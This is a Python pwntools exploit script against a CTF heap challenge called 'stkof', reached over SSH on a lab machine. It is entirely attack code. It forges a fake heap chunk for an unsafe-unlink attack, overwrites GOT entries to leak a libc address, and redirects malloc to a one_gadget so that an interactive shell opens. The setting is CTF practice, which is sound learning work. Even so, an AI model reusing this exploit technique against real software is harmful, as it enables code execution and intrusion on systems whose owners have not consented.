#!/usr/bin/env python

from pwn import *

# Utility functions
def alloc(tube, size, wait=True):
    tube.sendline("1")
    tube.sendline(str(size))
    if wait == True:
        log.info(tube.recvline())
        log.info(tube.recvline())
def fill(tube, chunk, size, datas):
    tube.sendline("2")
    tube.sendline(str(chunk))
    tube.sendline(str(size))
    tube.send(datas)
    log.info(tube.recvline())
def free_chunk(tube, chunk):
    tube.sendline("3")
    tube.sendline(str(chunk))
    log.info(tube.recvline())
def str_len(tube, chunk):
    tube.sendline("4")
    tube.sendline(str(chunk))
    address = tube.recvline().replace(b'\n',b"")
    address = address + b"\x00"*(8-len(address))
    log.info(tube.recvline())
    return u64(address)
context.terminal = ["tmux", "splitw", "-h"]

s1 = ssh(host='192.168.122.203', user='test', password='test')

p1 = s1.process("/home/test/CTF/stkof")
stof = ELF("./stkof")
libc = ELF("./libc-2.23.so")
#gdb.attach(p1, gdbscript='''
#        dir /usr/src/glibc
#        b *0x0040097c
#        continue
#        ''')
raw_input('Press for continue')
bfr = 0x602148
c1 = bfr + 0x8
alloc(p1, 0xa0)
alloc(p1, 0x80)
alloc(p1, 0x80)
alloc(p1, 0x80)

f1 = b"A"*0xa0
fill(p1,1,len(f1), f1)

#fc = b"A"*(0x80 - 0x30)
fc = b""
fc+= p64(0x0) # P_Size -- > IN_USE
fc+= p64(0x80) # Size
#fc+= p64(0xfdfdfdfdfdfdfdfd) # FD
fc+= p64(c1 - 0x18) # FD
#fc+= p64(0xfafafafafafafafa) # BK
fc+= p64(c1 - 0x10) # BK
fc+= b"C"*(0x80 - (len(fc)))

s_md = p64(0x80) #Previous Size
s_md+= p64(0x90) # Size
fill(p1, 2, len(fc + s_md), fc + s_md)
free_chunk(p1, 3)

## Now, I have the address of the vector stored in my array
f_address = b"P"*(0x40-0x38) + p64(0x602140 + (8*10))
fill(p1,2, len(f_address), f_address)
# Now I have space, not mandatory but nice
# I write the GOT address of strlen in order to replace it with puts
adds = p64(stof.got['strlen']) + p64(stof.got['malloc'])
fill(p1,0, len(adds), adds)
puts = p64(stof.symbols['puts'])
fill(p1,10,len(puts), puts)
malloc = str_len(p1,11)
libc_a = malloc - libc.symbols['malloc'] - 0x50
log.success("Leak malloc address "+hex(libc_a))
one_shot = p64(0xf02a4 + libc_a)
fill(p1,11,len(one_shot), one_shot)
alloc(p1,0x100, False)
p1.interactive()

